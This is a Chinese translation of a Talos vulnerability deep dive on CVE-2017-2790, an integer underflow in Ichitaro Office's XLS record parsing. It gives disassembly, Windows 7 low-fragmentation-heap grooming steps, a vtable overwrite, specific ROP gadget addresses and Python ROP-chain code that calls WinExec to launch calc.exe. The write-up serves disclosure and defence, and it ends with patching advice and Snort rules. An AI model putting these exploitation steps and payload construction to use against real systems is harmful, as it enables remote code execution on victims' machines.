
# 【漏洞分析】日版WPS远程代码执行漏洞详细分析


                                阅读量   
                                **101260**
                            
                        |
                        
                                                                                                                                    ![](./img/85752/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：talosintelligence.com
                                <br>原文地址：[http://blog.talosintelligence.com/2017/02/vulnerability-deep-dive-ichitaro-office.html](http://blog.talosintelligence.com/2017/02/vulnerability-deep-dive-ichitaro-office.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](./img/85752/t01826d53349073a33c.jpg)](./img/85752/t01826d53349073a33c.jpg)**



****

翻译：[啦咔呢](http://bobao.360.cn/member/contribute?uid=79699134)

稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**概述**

文字处理和办公产品中的漏洞是威胁行为者进行漏洞利用的有用目标。用户经常在日常生活中遇到这些软件套件所使用的文件类型，并且可能在电子邮件中打开这样的文件，或者被提示从网站下载这样的文件时并不会产生怀疑。

一些文字处理软件在使用特定语言的社区中被广泛使用，但在其他地方却鲜为人知。例如，Hancom的韩文字处理工具在韩国广泛使用，来自JustSystems的Ichitaro办公套件广泛应用于日本和说日语的社区。利用这些软件和与其相类似的文字处理系统中的漏洞，攻击者可以将攻击目标定位到特定国家或其预期受害者的语言社区。据推测，攻击者可能相信，对这些系统的攻击有可能不太会被安全研究人员发现，因为他们可能缺乏漏洞利用所必需的软件。

近来，Talos发现2了一个利用韩文字处理工具的复杂攻击[http://blog.talosintelligence.com/2017/02/korean-maldoc.html](http://blog.talosintelligence.com/2017/02/korean-maldoc.html) ，其中强调攻击者拥有可以创建出一种恶意文件的必要技术，而这种恶意文件旨在瞄准当地的办公软件套件。

Talos在Ichitaro Office套件中发现了三个漏洞，而这款软件是日本最流行的文字处理程序之一。

没有迹象表明， 我们在Ichitaro Office套件中发现的三个漏洞中的任何一个已经在野外被利用。然而，这三种漏洞都可以造成一种任意代码执行。我们选择了这些漏洞中的一个来更详细地解释如何利用这样的漏洞，并通过启动calc.exe来演示远程代码执行的意义。

有关此特定漏洞的建议，请访问[http://www.talosintelligence.com/reports/TALOS-2016-0197](http://www.talosintelligence.com/reports/TALOS-2016-0197) 

<br>

**深入探究 – TALOS-2016-0197（CVE-2017-2790） – JUSTSYSTEMS ICHITARO OFFICE EXCEL文件代码执行漏洞**

此漏洞围绕一个未检查的整数下溢问题，该问题是因为Ichitaro处理XLS文件工作簿流内的类型为0x3c的记录时未严格检查其长度。

在读取下一个记录（类型0x3c）时，应用程序计算需要复制到内存中的字节数。此计算涉及到了从文件本身读取到的值中减去一个值，进而导致整数下溢。



```
JCXCALC!JCXCCALC_Jsfc_ExConvert+0xa4b1e:
44b48cda 8b461e          mov     eax,dword ptr [esi+1Eh] // 下一条记录的文件数据
44b48cdd 668b4802        mov     cx,word ptr [eax+2]     // 取自文件的记录长度(in our case 0)
...
44b48ce4 6649            dec     cx                      // 0下溢为0xffff
...
44b48ce8 894d08          mov     dword ptr [ebp+8],ecx   // 保存数值 0xffff后面使用
```

之后在相同的函数中，这个下溢值被传递到处理文件数据复制的函数中。 

JCXCALC！JCXCCALC_Jsfc_ExConvert + 0xa4b46：



```
44b48d04 0fb75508 movzx edx，word ptr [ebp + 8] //将0xffff存储到edx
... ...
44b48d1f 52 push edx //压入长度
44b48d20 51 push ecx //压入目的地址 
44b48d21 83c005 add eax，5
44b48d24 52 push edx //压入长度
44b48d25 50 push eax //压入源地址
44b48d26 e8c5f7ffff call JCXCALC！JCXCCALC_Jsfc_ExConvert + 0xa4334（44b484f0）
```

主要的拷贝函数确实有一个检查，以确保长度大于零。下溢的数值在雷达下飞行，并通过所有检查。下面是使用相关变量名注释的拷贝函数。注意，由于在上述程序集中压入相同的寄存器，下面C代码中的size和size_是相等的。



```
int JCXCALC!JCXCCALC_Jsfc_ExConvert+0xa4334(int src, int size, int dst, int size_)
{
  int result; 
  result = 0;
  if ( !size_ )
    return size;
  if ( size &gt; size_ )
    return 0;
  if ( size &gt; 0 )
  {
    result = size;
    do
    {
      *dst = *src++;
      ++dst;
      --size;
    }
    while ( size );
  }
  return result;
}
```

dst地址是要分配的内存，其大小也取自文件中的TxO记录（类型0x1b6）。此大小在传递到malloc之前要先乘以2。



```
JCXCALC！JCXCCALC_Jsfc_ExConvert + 0xa4a1c：
442c8bd8 668b470e mov ax，word ptr [edi + 0Eh] //来自TxO元素的大小
442c8bdc 50 push eax
442c8bdd e88b87f6ff call JCXCALC！JCXCCALC_Jsfc_ExConvert + 0xd1b1（4423136d）
JCXCALC！JCXCCALC_Jsfc_ExConvert + 0xd1b1：
4423136d 0fb7442404 movzx eax，word ptr [esp + 4]
44231372 d1e0 shl eax，1 //攻击者大小* 2
44231374 50 push eax
44231375 ff1580d42f44 call ds：malloc //受控malloc
4423137b 59 pop ecx
4423137c c3 ret
```

总而言之，该漏洞向攻击者提供了以下结构：



```
*内存分配长度为受控值乘以2
*memcpy进入了长度为0xffff的内存分配中，该值是从攻击者控制的文件数据中获取的
```

<br>

**覆盖目标**

如果我们想在Windows 7上利用此漏洞，现在的问题就变成了，使用memcpy覆盖的最好目标是什么？一个办法可能是尝试使用虚函数覆盖对象的vtable，这样我们可以使用用户控制的指针来控制程序计数器。

为了使上述变得可行，我们的对象需要使用以下参数创建：



```
*对象必须以可预测的大小分配到堆的区域
*对象必须使用虚函数并具有虚表（vtable）。
*对象必须在覆盖发生后被销毁。
```

XLS文件由多个文档流组成，其中每个流都分为不同的记录。每个记录可以被描述为类型 – 长度 – 值（TLV）结构。这意味着每个记录将在前几个字节中指定其类型，随后是记录的长度，最后是包含在记录中由长度指定的字节数据。

一个小图如下所示： 



```
+ ------ + -------- + ------------ +
| 类型| 长度| 值|
+ ------ + -------- + ------------ +
struct Record {
    uint16_t type;
    uint16_t length;
    byte [length] value;
}}
```

作为示例，以下是类型为0x3c包含0xdeadbeef值的记录（长度是4，因为0xdeadbeef是4字节）。



```
+ -------- + -------- + ------------ +
| 类型 | 长度 | 值|
+ -------- + -------- + ------------ +
| 0x003c | 0x0004 | 0xdeadbeef |
+ -------- + -------- + ------------ +
```



```
&lt;class excel.RecordGeneral&gt;
[0] &lt;instance uint2'type'&gt; + 0x003c（60）
[2] &lt;instance uint2'length'&gt; + 0x0004（4）
[4] &lt;instance Continue'data'&gt;“xadxdexebxfe”
```

然后解析器将遍历流中的所有记录，然后基于记录所描述的类型和值来解析每个记录。由于我们目标记录的第三个约束，我们需要一个在解析期间使用vtable创建一些对象的类型，但是直到解析整个流后的某个阶段也不会释放该对象。

在研究了应用程序能够解析的各种类型记录后，发现Row记录具有以下属性：



```
*分配大小为0x14的数据结构
*此元素的对象包含一个vtable
*该元素的对象在EOF记录的解析期间通过调用其虚析构函数被销毁。
```

这意味着攻击者可以构造一个文件，其包含Row记录，和一些其他特定记录用以精确控制内存，然后覆盖Row记录的vtable。在此之后，他们可以结束一个EOF记录，该记录将调用属于Row记录的vtable。

此时的计划是定位我们从先前分配的Row对象之前的TxO记录覆盖位置，以便使用它来覆盖Row对象的vtable。

为了将攻击者控制的元素放置在Row记录之前，需要执行Windows 7低碎片堆的利用。下面描述简化说明。

<br>

**低碎片堆**

Windows 7组织涉及到PEB的堆内存并同时使用两种分配器。其中一个是后端，另一个是前端。前端堆是基于竞争的分配器，称为低碎片堆（LFH）。这主要在Chris Valasek关于低碎片堆的论文中有所记录：[http://illmatics.com/Understanding_the_LFH.pdf](http://illmatics.com/Understanding_the_LFH.pdf)    

LFH的一个重要特性是，分配的堆块是8的倍数。一旦进行堆分配，它的长度会除以8，然后用于确定从哪个内存段返回堆块。一旦片段被标识，内存段内的指针实际将指向根据该长度返回的堆块。这意味着分配给Row对象（0x14）的空间将向上取整为桶的长度0x18。对于桶长度0x18，在竞争场里有255个可用的槽位。

内存段



```
+ ------- + ------- + -------------------------------- + ----------- + ------- +
| ... | 竞争场| AggregateExchg.FreeEntryOffset | 块长度 | ... |
+ ------- + ------- + -------------------------------- + ----------- + ------- +
 竞争场
+ ----------------- + ----- + ----------- + --------- + --- ------ + ------------ +
| 段指针| ... | 签名| 块1 | 块2 | 块X ... |
+ ----------------- + ----- + ----------- + --------- + --- ------ + ------------ +
```

LFH的另一个重要特性是，直到目标应用程序的分配遵循特定模式才实际使用它。直到发生这种情况，分配器将使用后端分配器。为了确保LFH堆被用于特定的桶长度，目标应用程序必须进行相同长度的0x12（18）分配。一旦完成，那么将使用前端分配器来分配所有该长度的内存。发现Palette记录是非常灵活的，可以用来做任意永远不会释放的分配。启用桶的LFH的步骤如下：



```
*使用Palette记录分配相同大小的0x12内存。
*分配255个内存强制使分配器分配一个新的段。
```

（注意：这可以合并为255-0x12的分配。）

当第一次分配段时，平台将用一个到竞争场的偏移量初始化内存段，其确定了返回的第一个块。当分配内存段的竞争场时，每个块预先写有表示到要返回的下一个堆块偏移的16位偏移（FreeEntryOffset）。当进行分配时，将从竞争场中的下一空闲块开头读取16位偏移并存储在段内。块中的16位偏移将被覆盖，因为它是应用程序所请求分配的一部分。

竞争场 – 开始



```
+ ---------------- + -------------------- + ----------- ----- + ---------------- +
| 块1（占用）| 块2（空闲）| 块3（空闲）| 块X（空闲）|
| 数据：... | FreeEntryOffset：3 | FEO：4 | FEO：X + 1 |
+ ---------------- + -------------------- + ----------- ----- + ---------------- +
```

这样，当做出另一个分配时，分配器将在段中设置FreeEntryOffset，其中正在分配的块中的FreeEntryOffset使得在下一个分配期间它将知道要返回的下一个块位置。当分配块时，在要返回的块中的偏移和位于段内的偏移之间执行原子交换操作。这防止当多个线程从相同的段/场地分配时的并发问题。

```
状态0  - 开始
下一个槽位：3
当前加载到内存段的块3的偏移
v 
    + -------------------- + -------------------- + ------- --------------- +
    | 块3（空闲）| 块4（空闲）| 块X（空闲）|
    | FreeEntryOffset：4 | FreeEntryOffset：5 | FreeEntryOffset：X + 1 |
    + -------------------- + -------------------- + ------- --------------- +
状态1  -  malloc
返回槽位3。将FreeEntryOffset从块3加载到内存段中。
下一个槽位：4
                            现在是加载到内存段的块4偏移
                            v
    + ---------------- + -------------------- + ----------- ----------- +
    | 块3（占用）| 块4（空闲）| 块X（空闲）|
    | 数据：... | FreeEntryOffset：5 | FreeEntryOffset：X + 1 |
    + ---------------- + -------------------- + ----------- ----------- +
状态2  -  malloc
返回槽4.将FreeEntryOffset从块4加载到内存段中。
    下一个槽位：5
                                                    块5的偏移量被加载到段中
                                                    v
    + ---------------- + ---------------- + --------------- ------- +
    | 块3（占用）| 块4（占用）| 块X（空闲）|
    | 数据：... | 数据：... | FreeEntryOffset：X + 1 |
    + ---------------- + ---------------- + --------------- ------- + &lt;
```

偏移被写入与返回内存块相同的内存区域中，因此当内存块被应用程序使用时，它们将被应用程序存储到内存块的数据覆盖。由于这些偏移在分配之前被缓存在竞争场内的空闲块内，所以这些值可以被覆盖，用以欺骗分配器返回竞争场中任何位置的内存块。TxO记录用于覆盖由每个块保持的偏移，以欺骗分配器返回攻击者选择的槽位。



```
状态0  - 开始
下一个槽位：4
                        v
+ ---------------- + -------------------- + ----------- --------- +
| 块3（占用）| 块4（空闲）| 块5（空闲）|
| | FreeEntryOffset：5 | FreeEntryOffset：6 |
+ ---------------- + -------------------- + ----------- --------- +
状态1  -  TxO记录
返回槽位3.将来自块3的FreeEntryOffset（4）加载到内存段中。
下一个槽位：4
                                                  v
+ ---------------- + ------------------ + ------------- ------- +
| 块3（占用）| 块4（占用）| 块5（空闲）|
| | 数据：TxO Record | FreeEntryOffset：6 |
+ ---------------- + ------------------ + ------------- ------- +
状态2  -  TxO覆盖FreeEntryOffset
此时，下一个块的FreeEntryOffset将被XXX覆盖。
在这个例子中，我们将使用3来返回第3块
                                                 v
+ ---------------- + ------------------ + ------------- --------- +
| 块3（占用）| 块4（占用）| 块5（空闲）|
| | 数据：TxO Record | FreeEntryOffset：XXX |
+ + --------------------&gt; |
+ ---------------- + ------------------ + ------------- --------- +
状态3  -  malloc
分配器将返回块5，因为它是下一个块。
块5中的FreeEntryOffset将被加载到段中用于下一次分配。
如果TxO记录用3覆盖这个值，这将意味着块3将作为下一个块返回。
v
+ ---------------- + ------------------ + ------------- --- +
| 块3（占用）| 块4（占用）| 块5（占用）|
| | 数据：TxO Record | 数据：... |
+ + --------------------&gt; |
+ ---------------- + ------------------ + ------------- --- +
状态4  -  malloc
返回块3.块3中的第一个16位字也将被加载到内存段。
+ ---------------- + ------------------ + ------------- --- +
| 块3（占用）| 块4（占用）| 块5（占用）|
| | 数据：TxO Record | 数据：... |
+ ---------------- + ------------------ + ------------- --- +
```

这使攻击定位在最佳情况下，以覆盖在进程时间线内较早分配的对象。以下步骤可用于定位在Row对象的前面TxO缓冲区，以覆盖其vtable。



```
*使用TxO记录使大小为0x18的分配与Row对象处于同一个竞争场。
    *溢出TxO记录以覆盖FreeEntryOffset。
    *分配Row对象。这将强制覆盖的FreeEntryOffset加载到内存段中。
    *分配相同大小的另一个TxO记录，它将位于Row对象的前面。
    *将TxO记录溢出到包含Row对象的块中，以便控制其vtable。
```

发生这种情况后，解析最后一个EOF记录将导致Row对象的vtable可被取值，以便为Row对象调用析构函数。



```
0：000&gt; r
    eax = deadbeeb ebx = ffffffff ecx = 045d7d88 edx = 0000ffff esi = 00127040 edi = 00000000
    eip = 3f7205c7 esp = 00126fdc ebp = 00127028 iopl = 0 nv up ei pl nz na po nc
    cs = 001b ss = 0023 ds = 0023 es = 0023 fs = 003b gs = 0000 efl = 00010202
    JCXCALC！JCXCCALC_Jsfc_ExConvert + 0x9c40b：
    3f7205c7 ff5004 call dword ptr [eax + 4] ds：0023：deadbeef =
    0：000&gt; .logclose
    0：000&gt; dc ecx
    045d7d88 deadbeeb 64646464 64646464 64646464 dddddddddddddddd
    045d7d98 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7da8 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7db8 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7dc8 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7dd8 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7de8 64646464 64646464 64646464 64646464 dddddddddddddddd
    045d7df8 64646464 64646464 64646464 64646464 dddddddddddddddd
```

攻击者现在正在控制一个被调用的函数指针。

<br>

**代码执行**

看看崩溃的情况，攻击者控制一个被调用的指针，ecx的内容指向一个攻击者控制的缓冲区。为了实现代码执行，必须进行ROP gadget搜索以寻找stack pivot。目标是攻击者控制EIP并使堆栈指向攻击者控制的数据。幸运的是，以下模块在进程空间中，不受ASLR影响。



```
0：000&gt;！py mona mod -cm aslr = false
--------------------------------------------------
模块信息：
--------------------------------------------------
基地址|| 大小| ASLR | 模块名，路径
--------------------------------------------------
0x5f800000 || 0x000b1000 | False | [JSFC.DLL]
0x026b0000 || 0x00007000 | False | [jsvdex.dll]
0x27080000 || 0x000e1000 | False | [JSCTRL.DLL]
0x3f680000 || 0x00103000 | False | [JCXCALC.DLL]
0x22150000 || 0x00018000 | False | [JSMACROS.DLL]
0x003b0000 || 0x00008000 | False | [JSCRT40.dll]
0x61000000 || 0x0013b000 | False | [JSAPRUN.DLL]
0x3c7c0000 || 0x01611000 | False | [T26com.DLL]
0x23c60000 || 0x00024000 | False | [JSDFMT.dll]
0x03ad0000 || 0x0000b000 | False | [JSTqFTbl.dll]
0x40030000 || 0x0002c000 | False | [JSFMLE.dll]
0x21480000 || 0x00082000 | False | [jsgci.dll]
0x02430000 || 0x00008000 | False | [JSSPLEX.DLL]
0x43ab 0000 || 0x003af000 | False | [T26STAT.DLL]
0x217b0000 || 0x0001b000 | False | [JSDOC.dll]
0x22380000 || 0x0007a000 | False | [JSFORM.OCX]
0x211a0000 || 0x00049000 | False | [JSTDLIB.DLL]
0x21e50000 || 0x0002c000 | False | [JSPRMN.dll]
0x02a80000 || 0x0000e000 | False | [jsvdex2.dll]
0x277a0000 || 0x00086000 | False | [jsvda.dll]
0x61200000 || 0x000c6000 | False | [JSHIVW2.dll]
0x49760000 || 0x00009000 | False | [Jsfolder.dll]
0x210f0000 || 0x000a1000 | False | [JSPRE.dll]
0x213e0000 || 0x00022000 | False | [jsmisc32.dll]
```

不用说，这些模块中有大量的ROP gadget可以用。唯一的问题是攻击者不能直接调用ROP gadget，因为vtable条目是一个指针。在编译ROP gadget列表之后，需要在所有模块中进行搜索，以查看所有ROP gadget地址是否出现在任何模块中，从而有效地查找找到的ROP gadget的指针。幸运的是，下面的gadget出现了。



```
file:JSFC.DLL
JSFC.DLL.gadgets.40
Gadget:0x5f8170bc : sub esp, 4
                    push ebx
                    push esi
                    mov eax, dword ptr [ecx + 0xa0]
                    push edi
                    push ebp
                    mov esi, ecx
                    test eax, eax
                    je 0x5f8170ee
                    push esi
                    call eax
Simplified
file:JSFC.DLL
gadget:0x5f8170bc : mov eax, dword ptr [ecx + 0xa0] ;
                    mov esi, ecx 
                    call eax
```

此gadget允许指针从攻击者控制的缓冲区取值，并直接调用，允许直接调用gadget。作为来自第一个gadget的副作用，esi和ecx现在指向同一个攻击者控制的缓冲区。以下gadget实现完整stack pivot。



```
JSFC.DLL.gadgets.40
gadget:0x5f83636e : or bh, bh
                    push esi
                    pop esp
                    mov eax, edi
                    pop edi
                    pop esi
                    pop ebp
                    ret 0x1c
]Simplified
file:JSFC.DLL
26051:0x5f83636e :  push esi
                    pop esp
                    ret 0x1c
```

攻击者现在拥有完整的EIP和堆栈控制，允许构建适当的ROP链。



```
0：000&gt; r
    eax = 00000000 ebx = ffffffff ecx = 04559138 edx = 0000ffff esi = 62626262 edi = 5f86ecc8
    eip = deadbeef esp = 0455926c ebp = 62626262 iopl = 0 nv up ei ng nz na pe nc
    cs = 001b ss = 0023 ds = 0023 es = 0023 fs = 003b gs = 0000 efl = 00010286
    deadbeef ?? ???
    0：000&gt; dc esp
    0455926c 61616161 61616162 61616163 61616164 aaaabaaacaaadaaa
    0455927c 61616165 61616166 61616167 61616168 eaaafaaagaaahaaa
    0455928c 61616169 6161616a 6161616b 6161616c iaaajaaakaaalaaa
    0455929c 6161616d 6161616e 6161616f 61616170 maaanaaaoaaapaaa
    045592ac 61616171 61616172 61616173 61616174 qaaaraaasaaataaa
    045592bc 61616175 61616176 61616177 61616178 uaaavaaawaaaxaaa
    045592cc 61616179 6261617a 62616162 62616163 yaaazaabbaabcaab
    045592dc 62616164 62616165 62616166 62616167 daabeaabfaabgaab
```

这时候，攻击者可以通过将一个DLL（S）的导入表导入ntdll中来尝试检索WinExec。从ntdll的一个偏移可以检索到Kernel32。从Kernel32，可以检索到WinExec的偏移量，并且可以执行直接命令。或者…



```
$ r2 -q -c'ii〜WinExec'T26COM.DLL
    ordinal = 110 plt = 0x3d46c47c bind = NONE type = FUNC name = KERNEL32.dll_WinExec
... WinExec可以由一个已经加载的DLL导入并且攻击者可以简单地使用该地址。编译一个简单的ROP链以将字符串calc.exe放入内存并传递给WinExec函数指针。 
    command = ['calc'，'.exe'，' 0  0  0  0']
    for i,substr in enumerate(command):
        payload += pop_ecx_ret_8                # pop ecx; ret 8
        payload += p32(writable_addr + (i*4))   # Buffer to write the command
        payload += pop_eax_ret                  # pop eax; ret
        payload += p32(0xdeadbeec)              # eaten by ret 8
        payload += p32(0xdeadbeed)              # eaten by ret 8
        payload += substr                       # Current four bytes to write
        payload += write_mem                    # mov dword [ecx], eax; xor eax, eax
    ret
```

一旦命令字符串在内存中，取值WinExec指针并使用缓冲区调用它想执行的命令。



```
＃Deref WinExec import
   payload += pop_edi_esi_ebx_ret
    payload += p32(winexec-0x64)    # pop edi (offset due to [edi + 0x64])
    payload += p32(0xdeadbeee)      # eaten by pop esi
    payload += p32(0xdeadbeef)      # eaten by pop ebx
    # Call WinExec with buffer pointing to calc.exe
    payload += deref_edi_call       # mov esi, dword [edi + 0x64]; call esi
    payload += p32(writable_addr)   # Buffer with command
    payload += p32(1)               # Display the calc (0 will hide the command output)
```

下面视频中显示的是在Windows 7运行关于Ichitaro 2016 v0.3.2612的漏洞利用。

[https://3.bp.blogspot.com/-JyhFqP4cFgY/WLBjwW1YBmI/AAAAAAAAAR0/6NGkmAnrbTw5JTPGvv2d26pPDZ3xe-s1gCLcB/s640/image00.gif](https://3.bp.blogspot.com/-JyhFqP4cFgY/WLBjwW1YBmI/AAAAAAAAAR0/6NGkmAnrbTw5JTPGvv2d26pPDZ3xe-s1gCLcB/s640/image00.gif) 

<br>

**结论**

乍一看报告说，应用程序不检查由特定文件格式提供的长度值是否大于零可能听起来像一个错误，而不是一个漏洞。我们希望这篇文章可以描述一个漏洞开发者如何利用程序逻辑中的一个非常简单的遗漏来创建一个武器化文件，该文件可用于在受害者的系统上执行任意代码。

这些漏洞的性质以及它们对威胁主体的吸引力，就是为什么系统与补丁需要保持更新的最重要原因。这也是为什么Talos要在发布漏洞详细信息之前，开发并发布对发现的每个漏洞进行检测的原因。

Talos致力于在坏人之前发现软件漏洞，并根据我们负责的漏洞披露政策与供应商合作，以确保这样的武器化攻击不会导致系统受损。

Snort规则：40125 – 40126，41703 – 41704
